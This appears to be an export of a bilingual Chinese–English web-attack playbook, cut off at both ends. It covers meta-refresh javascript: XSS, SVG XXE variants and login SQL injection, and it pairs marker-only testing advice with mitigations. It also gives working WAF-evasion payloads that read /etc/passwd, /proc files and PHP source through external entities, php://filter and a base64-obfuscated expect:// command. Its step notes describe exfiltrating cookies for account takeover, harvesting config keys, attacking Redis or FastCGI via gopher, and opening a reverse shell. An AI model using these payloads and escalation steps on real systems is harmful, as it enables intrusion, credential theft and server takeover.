description.en: UNION-read the listed user and password columns, crack the hashes offline and replay at the login; a successful login converts injection into account control.

prerequisites.zh: 目标数据库支持 INFORMATION_SCHEMA 且查询列型兼容
prerequisites.en: The target database supports INFORMATION_SCHEMA and compatible query columns.

prerequisites.zh: 专用 schema 只含少量伪表与列
prerequisites.en: A dedicated schema contains only a small set of synthetic relations and columns.

analysis.zh: 以返回的专用测试元数据为充分证据并停止，不需要读取真实表数据。报告应注明数据库产品、目录范围和账户权限。
analysis.en: Treat returned dedicated test metadata as sufficient and stop without reading real records. State database product, catalog scope, and account privileges.

opsecTips.zh: 只查询专用 schema，并强制 LIMIT/过滤，禁止全库目录导出。
opsecTips.en: Query only the dedicated schema with mandatory filters and LIMIT; never export the full catalog.

opsecTips.zh: 表名与列名使用伪数据，不在报告中记录生产 schema。
opsecTips.en: Use synthetic relation and column names and omit production schema from reports.

name.zh: Meta Refresh JavaScript URL 边界

description.zh: 使用 meta refresh 的 javascript: 目标验证浏览器、HTML 消毒器与 CSP 是否阻止元数据驱动的活动 URL。
description.en: Uses a meta refresh javascript target to test whether the browser, HTML sanitizer, and CSP block active URLs in metadata-driven navigation.

overview.zh: 覆盖 meta refresh 驱动活动 URL 的边界验证：以 meta refresh 导航到 javascript: URL，验证浏览器、HTML 消毒器与 CSP 是否阻止元数据驱动的脚本导航。适用于富文本或模板允许 meta/http-equiv 的场景。
overview.en: Covers active-URL boundary verification via meta refresh: navigating to a javascript: URL through meta refresh to test whether the browser, HTML sanitizer, and CSP block metadata-driven script navigation. Suitable when rich text or templates allow meta/http-equiv.

vulnerability.zh: 根因是富文本或模板允许用户创建 meta/http-equiv/content 属性，且浏览器把目标解释为活动 javascript URL；缺少元素/属性允许列表、输出编码与 CSP 时注入即获得导航或执行能力。
vulnerability.en: The root cause is rich text or templates letting users create meta/http-equiv/content attributes with the browser interpreting the target as an active javascript URL; without element/attribute allowlists, output encoding, and CSP, injection gains navigation or execution capability.

exploitation.zh: 使用第 1 步命令以 meta refresh 导航到 javascript: URL，在隔离页面把 alert 替换为随机内存标记；内存标记被设置且导航 URL 与 CSP 控制台被记录即确认活动 URL 边界。先用普通 meta refresh 到自有静态页面建立功能基线，标签保留但 URL 不执行应记录为安全结果。
exploitation.en: Use the step 1 command to navigate to a javascript: URL via meta refresh, replacing alert with a random memory flag in an isolated page; the flag being set plus the navigation URL and CSP console recorded confirms the active-URL boundary. Baseline first with plain meta refresh to your own static page; a retained tag whose URL does not execute is a safe result to record.

mitigation.zh: 用户内容禁止 meta/http-equiv，富文本消毒器采用元素与属性允许列表并拒绝 javascript: 等活动协议，导航由服务端固定 URL 生成，部署严格 script-src/object-src/base-uri CSP。
mitigation.en: Forbid meta/http-equiv in user content, apply element and attribute allowlists in rich-text sanitizers rejecting javascript: and other active protocols, generate navigation from server-fixed URLs, and deploy strict script-src/object-src/base-uri CSP.

description.zh: 在站内寻找把用户输入回显进HTML的参数，提交标记字符串确认落点在文档体内，标记原样出现即锁定注入位置。
description.en: Find parameters echoed into HTML and submit a marker string; the marker landing verbatim in the body locks the injection spot.

title.en: Inject a meta refresh for execution

description.zh: 用执行区载荷提交http-equiv为refresh且url指向javascript:的meta标签，页面发生跳转并弹出标记即确认活动URL被执行。
description.en: Submit the meta refresh pointing at a javascript: URL per the execution payload; the navigation firing the marker confirms active URL execution.

description.zh: 把javascript地址改为携带document.cookie的外带请求，诱使受害者触发，接收端收到Cookie即完成账户接管材料收集。
description.en: Point the javascript URL at an exfil request carrying document.cookie and bait a victim; cookies arriving at the receiver complete the takeover kit.

prerequisites.zh: 输入可创建 meta 元素并进入有效文档位置
prerequisites.en: Input can create a meta element in an effective document position.

prerequisites.zh: 使用隔离浏览器和无副作用内存标记观察导航/执行
prerequisites.en: An isolated browser and side-effect-free in-memory marker are used to observe navigation or execution.

analysis.zh: 浏览器版本和文档位置会影响结果，报告需给出 User-Agent、DOM 位置、CSP 与实际导航/标记，不从理论语法直接下结论。
analysis.en: Browser version and document placement affect results. Report user agent, DOM position, CSP, and actual navigation or marker rather than concluding from syntax theory.

opsecTips.zh: 仅使用内存标记，不弹窗、不读取页面数据、不导航到第三方。
opsecTips.en: Use only an in-memory marker with no dialog, page-data read, or third-party navigation.

opsecTips.zh: 在一次性隔离页面测试，避免零秒刷新影响共享会话。
opsecTips.en: Test on a disposable isolated page so zero-delay refresh cannot affect shared sessions.

description.zh: 绕过 javascript: 明文匹配：冒号实体化。判据：刷新时执行。
description.en: Entity-encodes the colon of javascript:. Success: executes on refresh.

description.zh: 绕过 URL 内容检测：目标 base64 化。判据：跳转后执行。
description.en: Base64-wraps the redirect target. Success: payload executes after refresh.

description.zh: 绕过小写标签/属性匹配。判据：执行成功。
description.en: Uppercase everything to break lowercase rules. Success: executes.

description.zh: 绕过 0 秒跳转特征并延长驻留窃取时机。判据：3 秒后弹 cookie。
description.en: Longer delay avoids 0-second signatures and widens the steal window. Success: cookie alert after delay.

name.zh: SVG 外部通用实体资源解析

description.zh: 归并 file 与 HTTP SYSTEM 标识符变体，验证 SVG text 节点中的外部通用实体是否由图片 worker 展开。
description.en: Groups file and HTTP SYSTEM-identifier variants to test whether an image worker expands external general entities in an SVG text node.

overview.zh: 覆盖上传后异步图片任务解析 SVG 的外部通用实体验证：以 SVG 实体逐行注入文件、proc、元数据与回环样例。常见触发点是读取宽高、缩略图、OCR 或格式转换。
overview.en: Covers external general entity verification where async image tasks parse SVG after upload: injecting file, proc, metadata, and loopback samples line by line via SVG entities. Common triggers are dimension reads, thumbnails, OCR, and format conversion.

vulnerability.zh: 根因是后续图片处理器使用通用 XML 解析配置并继承文件、网络权限，而上传层只验证扩展名或 MIME；前端能查看原始 SVG 不代表后端展开实体，异步任务需以任务 ID 关联证据。
vulnerability.en: The root cause is downstream image processors using generic XML parsing configurations that inherit file and network privileges while the upload layer validates only extension or MIME; a viewable original SVG never implies backend entity expansion, and async tasks need task-ID-correlated evidence.

exploitation.zh: 使用第 1 步命令以 SVG 外部通用实体逐行注入文件、proc、元数据与回环样例；渲染文本或日志出现 marker 即确认对应实体可达。执行前把真实路径、回环与元数据地址改为 worker 沙箱 marker 或隔离 HTTP token，先上传合法 SVG 记录正常基线再逐个变体运行。
exploitation.en: Use the step 1 command to inject file, proc, metadata, and loopback samples line by line via SVG external general entities; markers appearing in rendered text or logs confirm each entity is reachable. Before running, swap real paths, loopback, and metadata addresses for worker-sandbox markers or isolated HTTP tokens; baseline with a legitimate SVG upload first, then run variants one by one.

mitigation.zh: 上传后立即对 SVG 安全解析或转位图，后续只消费净化产物；为所有图片库禁用外部实体与远程资源，任务容器无出站网络与敏感文件访问；对异步任务记录哈希、异常与网络事件。
mitigation.en: Sanitize or bitmap-convert SVGs immediately after upload so only clean artifacts flow onward; disable external entities and remote resources in all image libraries, and run task containers without egress or sensitive-file access; log hashes, exceptions, and network events for async tasks.

description.zh: 寻找上传SVG生成缩略图或预览的功能，提交正常SVG确认任务成功，渲染出图形即锁定可注入实体的处理入口。
description.en: Find SVG thumbnail or preview features; a normal SVG rendering cleanly locks the entity-injectable processing entry.

title.en: Inject an SVG entity to read files

description.zh: 用执行区载荷把外部实体放入SVG的text节点上传，渲染文本或后端日志出现文件内容即确认服务端读取成立。
description.en: Place the entity in the text node per the execution payload and upload; file contents in rendered text or logs confirm server-side read.

title.zh: 读取部署配置扩大战果

description.zh: 把实体SYSTEM换成应用配置、密钥与环境文件路径，沿用第2步的上传流程读取，取得凭据即进入横向利用阶段。
description.en: Aim the entity at configs, keys, and env files via the step-2 flow; retrieved credentials open the lateral stage.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: Uploaded SVG is parsed as XML by a server-side dimension, preview, or rasterization worker rather than stored statically or viewed only client-side.

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

analysis.zh: 阳性要求图片 worker 读取 marker 或发出 token 请求，并让展开值进入 SVG 模型、栅格结果或提取文本；源码或客户端显示不计。
analysis.en: A positive requires the image worker to read the marker or send the token request and place expanded data in the SVG model, raster output, or extracted text; source text or client rendering does not count.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><defs><text id="t">&x;</text></defs><use xlink:href="#t"/></svg>

description.zh: 实体藏在 defs 内经 use 复用展示，规避对 text 直引的检测；成功判据：渲染结果含 passwd 内容。
description.en: Hides the entity inside defs and reuses it via use, evading direct text-reference detection. Success: rendering shows passwd contents.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/hostname">]><svg xmlns="http://www.w3.org/2000/svg"><title>&x;</title><rect width="10" height="10"/></svg>

description.zh: 实体放入 title 元数据节点，绕过图形内容检测分支；成功判据：无障碍/悬停文本泄露主机名。
description.en: Places the entity in the title metadata node to bypass graphic-content inspection. Success: hostname leaks via accessibility or hover text.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a SYSTEM "file:/etc/hostname"><!ENTITY b SYSTEM "file:/proc/version">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="10">&a;-&b;</text></svg>

description.zh: file:/ 单斜杠加双实体拼接，规避 file:/// 与单实体双特征；成功判据：文本同时含两文件内容。
description.en: Uses single-slash file:/ with two entities joined, evading both the file:/// literal and single-entity signatures. Success: text contains both files' contents.

name.zh: SVG Gopher 实体请求边界

description.zh: 隔离 SVG 外部实体中的 gopher URI，验证图片解析器是否委托非 HTTP scheme。
description.en: Isolates the gopher URI in an SVG external entity to test whether the image parser delegates a non-HTTP scheme.

overview.zh: 覆盖 SVG 图片解析器对非 HTTP scheme 的委托验证：以 SVG 实体承载 gopher:// 请求，自有 resolver 收到单次请求即确认 gopher wrapper 被解析。用于评估图片 worker 的出站协议边界。
overview.en: Covers delegation verification for non-HTTP schemes in SVG image parsers: an SVG entity carrying a gopher:// request, with your resolver receiving one request confirming the gopher wrapper was resolved. Used to assess the image worker's outbound protocol boundary.

vulnerability.zh: 根因是后续图片处理器继承网络权限且 resolver 接受 gopher 等协议，可被用于构造任意出站流量；验证只证明 wrapper 被解析，不发送真实协议副作用数据。
vulnerability.en: The root cause is downstream image processors inheriting network privileges with resolvers accepting protocols like gopher, enabling arbitrary outbound traffic crafting; verification proves only wrapper resolution and sends no real protocol side-effect data.

exploitation.zh: 使用第 1 步命令以 SVG 实体承载 gopher:// 请求；自有 resolver 收到单次请求即确认 gopher wrapper 被解析。不要发送原始 Redis INFO 数据，把 URI 替换为无协议副作用的单次 resolver marker；先上传合法 SVG 建立任务基线再触发解析。仅证明 wrapper 解析行为，协议副作用数据一律不发送。
exploitation.en: Use the step 1 command to carry a gopher:// request in an SVG entity; your resolver receiving one request confirms the gopher wrapper was resolved. Never send raw Redis INFO data — replace the URI with a single side-effect-free resolver marker; baseline with a legitimate SVG upload before triggering parsing. Prove only wrapper resolution — protocol side-effect data is never sent.

mitigation.zh: 图片处理链禁用外部实体并把出站协议限制为白名单（明确拒绝 gopher 等非业务 scheme）；任务容器无网络运行，对协议委托与网络事件建立监控。
mitigation.en: Disable external entities in the image-processing chain and allowlist outbound protocols (explicitly rejecting non-business schemes like gopher); run task containers without networking and monitor protocol delegation and network events.

description.zh: 在可控服务器上开启原始端口监听并记录收到的字节流，确认SVG上传处理接口可用，即完成攻击前置准备。
description.en: Open a raw listener on a controlled host logging bytes and confirm the SVG processing endpoint; staging is complete.

title.en: Fire a request via the gopher entity

description.zh: 用执行区载荷把实体指向gopher://内网地址，上传触发栅格化后接收端收到请求即确认可伪造任意协议报文。
description.en: Point the entity at a gopher:// address per the execution payload and trigger rasterization; a hit at the receiver confirms forged packets.

title.zh: 打击内网指纹出的服务

description.zh: 结合端口扫描结果把gopher目标换成Redis、FastCGI等服务，沿用第2步的注入构造攻击报文，落盘或回连成功即拿下主机。
description.en: Aim gopher at Redis or FastCGI found by scanning, reusing the step-2 injection; a landed artifact or callback owns the host.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: Uploaded SVG is parsed as XML by a server-side dimension, preview, or rasterization worker rather than stored statically or viewed only client-side.

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

analysis.zh: 阳性只是在受控 resolver 收到图片 worker 的当前任务 token；编码载荷、DNS、预览失败或客户端流量不是协议请求证据。
analysis.en: A positive is limited to the controlled resolver receiving the current job token from the image worker; encoded payload text, DNS, preview failure, or client traffic is not protocol-request evidence.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

description.zh: 不用实体，经 xlink:href 触发 gopher 请求，绕过 DOCTYPE 检测；成功判据：Redis 收到 INFO。
description.en: Triggers gopher via xlink:href instead of entities to bypass DOCTYPE detection. Success: Redis receives INFO.

description.zh: 换行双重编码规避一次解码后的 CRLF 检测；成功判据：注入命令序列被执行。
description.en: Double-encodes newlines to survive single-decode CRLF inspection. Success: the injected command sequence executes.

title.zh: 大写协议与实体名变形

description.zh: 协议大写+实体短名 r+desc 节点引用，多重规避特征组合；成功判据：内网服务收到请求。
description.en: Uppercase scheme, short entity name r, and desc-node reference provide layered evasion. Success: the internal service receives the request.

name.zh: SVG PHP Filter 实体读取边界

description.zh: 隔离 php://filter 实体，验证 PHP/libxml 图片处理链是否把 stream wrapper 暴露给 SVG 解析。
description.en: Isolates a php://filter entity to test whether a PHP/libxml image pipeline exposes stream wrappers during SVG parsing.

overview.zh: 覆盖 PHP/libxml 图片处理链的 stream wrapper 暴露验证：以 SVG 实体承载 php://filter 读取，Base64 结果解码为 marker 即确认 filter 读取边界。适用于 PHP 技术栈的 SVG 处理服务。
overview.en: Covers stream-wrapper exposure verification in PHP/libxml image-processing chains: an SVG entity carrying php://filter reads, with the Base64 result decoding to a marker confirming the filter read boundary. Suitable for PHP-stack SVG processing services.

vulnerability.zh: 根因是 PHP/libxml 图片处理链允许 stream wrapper 且继承文件读取权限，上传层只验证 MIME；filter 读取可编码获取任意文件内容，需在隔离 fixture 中以随机 marker 验证。
vulnerability.en: The root cause is PHP/libxml image chains allowing stream wrappers that inherit file-read privileges while the upload layer checks only MIME; filter reads obtain arbitrary file content in encoded form, verified with random markers inside isolated fixtures.

exploitation.zh: 使用第 1 步命令以 SVG 实体承载 php://filter 读取；Base64 结果解码为单行 marker 即确认 filter 读取边界。不得读取原始系统路径，在隔离 PHP fixture 中把 resource 改为单行随机 marker；先记录正常缩略图基线再触发预览或转码任务。解码结果与预置 marker 不符按阴性记录并复查 wrapper 配置。
exploitation.en: Use the step 1 command to carry php://filter reads in an SVG entity; the Base64 result decoding to a single-line marker confirms the filter read boundary. Never read original system paths — point resource at a single-line random marker inside an isolated PHP fixture; baseline normal thumbnails before triggering preview or conversion tasks. Record negatives when decoded content mismatches the preset marker and recheck wrapper settings.

mitigation.zh: 图片处理链禁用外部实体与 stream wrapper，PHP 环境按需关闭非业务协议包装器；任务容器最小文件视图，对 filter 类实体访问建立审计与回归。
mitigation.en: Disable external entities and stream wrappers in the image-processing chain, closing non-business protocol wrappers in PHP as needed; give task containers a minimal file view with audits and regressions over filter-class entity access.

description.zh: 通过上传接口报错特征判断SVG由PHP解析，普通文件实体无回显时即选择base64编码的filter路线准备读取。
description.en: Judge from uploader errors that PHP parses the SVG; with no direct echo, take the base64 filter read route.

title.en: Inject a filter entity to read source

description.zh: 用执行区载荷声明php://filter实体并上传SVG，响应或日志出现Base64串，解码得到源码内容即确认读取链生效。
description.en: Declare the php://filter entity per the execution payload and upload; a Base64 blob decoding to source confirms the chain.

title.en: Mine the source for an exploit chain

description.zh: 审计解码出的代码找硬编码密钥、包含点与命令调用，复验任一漏洞点成立即把文件读取推进为代码执行。
description.en: Audit the decoded code for hardcoded keys, includes, and command calls; one confirmed flaw upgrades read into execution.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: Uploaded SVG is parsed as XML by a server-side dimension, preview, or rasterization worker rather than stored statically or viewed only client-side.

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

analysis.zh: 阳性要求目标 PHP 图片 worker 读取 marker 且展开值进入派生产物；wrapper 字符串被接受或 base64 文本出现不是读取。
analysis.en: A positive requires the target PHP image worker to read the marker and place expanded data in a derived artifact; accepting wrapper text or showing base64 text is not a read.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode/resource={WEB_ROOT}/index.php">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&x;</text></svg>

description.zh: CSISO2022KR 图标链前缀打乱输出，规避标准 filter 链特征；成功判据：还原后得到源码。
description.en: Prefixes a CSISO2022KR iconv stage to mutate output and evade standard filter-chain signatures. Success: recovered output decodes to source.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"><!ENTITY b SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&a;</text><text x="0" y="36">&b;</text></svg>

description.zh: 两实体读不同文件分散特征，规避单资源路径匹配；成功判据：两段 base64 分别还原。
description.en: Two entities read different files to scatter signatures away from any single resource path. Success: both base64 strings decode.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><text id="s" x="0" y="16">&x;</text><use xlink:href="#s"/></svg>

description.zh: 经 use 复用 text 节点，规避 text 直引检测分支；成功判据：渲染文本含编码源码。
description.en: Reuses the text node via use to evade direct text-reference detection. Success: rendered text contains the encoded source.

name.zh: SVG PHP Expect 实体执行边界

description.zh: 隔离 expect:// 实体，验证 PHP expect 扩展是否意外暴露给 SVG XML resolver。
description.en: Isolates an expect:// entity to test whether the PHP expect extension is accidentally exposed to the SVG XML resolver.

overview.zh: 覆盖 SVG XML resolver 对 PHP expect:// 包装器的暴露验证：以 SVG 实体承载 expect:// 包装器，返回任务 marker 即确认执行边界被触达。用于评估 SVG 处理链的命令执行升级条件。
overview.en: Covers exposure verification of the PHP expect:// wrapper in SVG XML resolvers: an SVG entity carrying the expect:// wrapper, with the returned task marker confirming the execution boundary was reached. Used to assess command-execution escalation preconditions in SVG chains.

vulnerability.zh: 根因是 PHP expect 扩展启用时 expect:// wrapper 对 SVG 解析器可用，实体内容会被当作命令执行；与文件读取是独立升级路径，需以无子进程的测试 wrapper 单独确认。
vulnerability.en: The root cause is the expect:// wrapper being available to SVG parsers when the PHP expect extension is enabled, so entity content executes as a command; this is an escalation path independent of file reads, confirmed separately with a subprocess-free test wrapper.

exploitation.zh: 使用第 1 步命令以 SVG 实体承载 expect:// 包装器；wrapper 返回当前任务 marker 即确认 expect 执行边界被触达。绝不运行原始 id 命令，只用无子进程测试 wrapper；先上传合法 SVG 记录基线，再在预览或转码任务中触发。扩展未启用时的报错形态留档作为阴性依据。
exploitation.en: Use the step 1 command to carry the expect:// wrapper in an SVG entity; the wrapper returning the current task marker confirms the expect execution boundary was reached. Never run the raw id command — use only a subprocess-free test wrapper; baseline with a legitimate SVG upload, then trigger within preview or conversion tasks. Archive the error shape as negative evidence when the extension is disabled.

mitigation.zh: 生产 PHP 禁用 expect 扩展，SVG/XML 解析器禁用外部实体与自定义 wrapper；修复后 expect 实体应报未知 wrapper 且无 marker 返回，并在基线中固化。
mitigation.en: Disable the expect extension in production PHP and forbid external entities and custom wrappers in SVG/XML parsers; after the fix, expect entities must report an unknown wrapper with no marker returned, locked into the baseline.

description.zh: 确认SVG处理运行于PHP且DOCTYPE不被过滤，提交带实体声明的最小SVG无报错，即具备尝试expect包装器的条件。
description.en: Confirm PHP processing and unfiltered DOCTYPE; a minimal entity-bearing SVG parsing cleanly clears the way for expect.

title.en: Inject an expect entity to execute

description.zh: 用执行区载荷声明expect://id实体并触发渲染，输出中出现uid与主机名即确认SVG入口可达系统命令执行。
description.en: Declare the expect://id entity per the execution payload and render; uid and hostname output confirm command execution.

description.zh: 把expect命令替换为建立反向连接的语句，沿用第2步的SVG注入方式触发，收到shell会话即完成服务器控制。
description.en: Swap the expect command for a reverse connection, retriggering as in step 2; the shell session owns the server.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: Uploaded SVG is parsed as XML by a server-side dimension, preview, or rasterization worker rather than stored statically or viewed only client-side.

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

analysis.zh: 阳性要求无副作用测试 wrapper 在处理该 SVG 的 PHP worker 内被调用；命令文本、解析错误或 scheme 被识别不能证明执行。
analysis.en: A positive requires the side-effect-free test wrapper to be invoked in the PHP worker processing this SVG; command text, parse errors, or scheme recognition does not prove execution.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

wafBypass.command: <?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "expect://echo aWQ=|base64 -d">]><svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="16">&x;</text></svg>

description.zh: 命令 base64 化规避 expect://id 明文；成功判据：文本节点回显 uid。
description.en: Base64-encodes the command to evade the plaintext expect://id. Success: the text node echoes uid.

description.zh: 引用放入 title 元数据节点，规避 text 内容检测；成功判据：标题泄露 uid。
description.en: Moves the reference into the title metadata node to evade text-content inspection. Success: the title leaks uid.

description.zh: 实体名换 cmd 并在声明中插换行，规避 xxe 命名与一行式特征；成功判据：渲染文本含用户名。
description.en: Renames the entity and adds newlines in the declaration to evade xxe naming and one-line signatures. Success: rendered text contains the username.

name.zh: SVG XInclude 文件读取边界

description.zh: 隔离 xi:include 文本加载变体，验证图片处理链是否在无 DOCTYPE 时启用 XInclude。
description.en: Isolates the xi:include text-loading variant to test whether the image pipeline enables XInclude without a DOCTYPE.

overview.zh: 覆盖 SVG 图片处理链在无 DOCTYPE 时的 XInclude 验证：以 xi:include 在 SVG 文本节点包含外部资源，包含结果出现 marker 即确认处理开启。用于区分 XInclude 与 DTD 实体两种机制。
overview.en: Covers XInclude verification in SVG image-processing chains without a DOCTYPE: including external resources in SVG text nodes via xi:include, with marker content in results confirming processing is on. Used to separate the XInclude mechanism from DTD entities.

vulnerability.zh: 根因是图片处理链显式调用 XInclude 处理且 resolver 可访问 file URI；XInclude 不依赖 DOCTYPE，处理器启用该特性即可读取外部文本，与实体展开是不同触发路径。
vulnerability.en: The root cause is image-processing chains explicitly invoking XInclude with resolvers able to access file URIs; XInclude needs no DOCTYPE, so a processor enabling the feature reads external text — a distinct trigger path from entity expansion.

exploitation.zh: 使用第 1 步命令以 XInclude 在 SVG 文本节点包含外部资源；包含结果出现 marker 内容即确认 XInclude 处理开启。把 file URI 改为 worker 工作目录内只含随机值的 marker.txt，先上传合法 SVG 记录基线再触发预览或转码。包含结果为空时按阴性处理，并复查处理器 XInclude 开关。
exploitation.en: Use the step 1 command to include an external resource in SVG text nodes via XInclude; marker content in the included result confirms XInclude processing is on. Point the file URI at a marker.txt holding only random values inside the worker's working directory, baseline with a legitimate SVG upload, then trigger preview or conversion. Treat empty inclusion results as negative and recheck the processor XInclude switch.

mitigation.zh: SVG/XML 解析器不启用 XInclude 处理，必须使用时以资源白名单与拒绝 file URI 的 resolver 约束；worker 无网络低权限，对 include 元素与最终 URI 建立审计。
mitigation.en: Do not enable XInclude processing in SVG/XML parsers; when unavoidable, constrain with resource allowlists and resolvers rejecting file URIs; keep workers network-free with low privileges, auditing include elements and final URIs.

description.zh: 上传带xi命名空间声明的SVG观察是否报错，渲染任务正常完成即提示处理器可能支持XInclude，锁定注入载体。
description.en: Upload an SVG with the xi namespace and watch for errors; a clean render hints XInclude support and locks the carrier.

description.zh: 用执行区载荷在text节点放xi:include指向file:///etc/passwd并上传，渲染文本出现文件内容即确认读取原语。
description.en: Place xi:include at passwd in the text node per the execution payload; rendered text carrying contents confirms the read primitive.

title.en: Pivot to config and key files

description.zh: 将href目标改为部署配置与凭据文件，沿用第2步的SVG结构重传读取，收获可用密钥即完成扩大战果。
description.en: Point the href at deployment configs and credential files, re-uploading the step-2 structure; harvested keys complete the expansion.

prerequisites.zh: 上传后的 SVG 会由服务端尺寸读取、预览或栅格化 worker 解析 XML，而不是仅静态存储或客户端浏览。
prerequisites.en: Uploaded SVG is parsed as XML by a server-side dimension, preview, or rasterization worker rather than stored statically or viewed only client-side.

prerequisites.zh: 测试 SVG 的实体只引用 worker 沙箱内固定 marker，异步任务保存上传 ID、worker PID、文件审计和生成图像/OCR 文本。
prerequisites.en: The test SVG entity references only a fixed marker inside the worker sandbox, with upload identifier, worker PID, file audit, and generated image or OCR text preserved for the asynchronous job.

analysis.zh: 阳性要求图片 worker 读取 marker 且值进入对应 SVG text 节点或派生产物；namespace/href 存在或 open 失败不是内容读取。
analysis.en: A positive requires the image worker to read the marker and place its value in the SVG text node or derived artifact; a namespace, href, or failed open is not a content read.

opsecTips.zh: SVG 上传 XXE 只读 worker 沙箱 marker；出现主机真实文件访问、外连、处理队列积压、图像炸弹行为或 worker 重启时停止。
opsecTips.en: SVG upload XXE reads only a worker-sandbox marker; stop on real host-file access, egress, processing backlog, image-bomb behavior, or worker restarts.

opsecTips.zh: 删除上传 SVG、marker、临时解包/栅格文件和预览，清理对象存储/任务队列/图像缓存并重启 worker。
opsecTips.en: Delete uploaded SVGs, markers, temporary extraction or raster files, and previews, clear object storage, job queues, and image caches, and restart workers.

description.zh: XInclude 放入 defs 复用区，规避 text 节点扫描；成功判据：渲染或解析错误泄露内容。
description.en: Places XInclude inside defs to evade text-node scanning. Success: rendering or parse errors leak contents.

description.zh: 经 tspan 子元素承载包含指令，规避 text 直包含特征；成功判据：文本渲染含文件内容。
description.en: Carries the include via a tspan child to evade direct text inclusion signatures. Success: rendered text contains file contents.

description.zh: file 首字符实体编码，规避 href="file 明文匹配；成功判据：主机名进入文本。
description.en: Entity-encodes the first character of file to hide the href="file literal. Success: the hostname lands in the text.

name.zh: 登录认证 SQL 注入

description.zh: 使用引号、布尔恒真和注释边界变体，验证登录标识是否被拼接进 SQL 并改变凭据匹配条件。
description.en: Uses quote, tautology, and comment-boundary variants to test whether login identifiers are concatenated into SQL and alter credential matching.

overview.zh: 覆盖登录认证 SQL 注入验证：引号、布尔恒真与注释边界变体作用于登录标识字段，恒真变体返回登录成功即确认认证绕过。适用于用户名或密码被拼接进 WHERE 条件的登录入口。
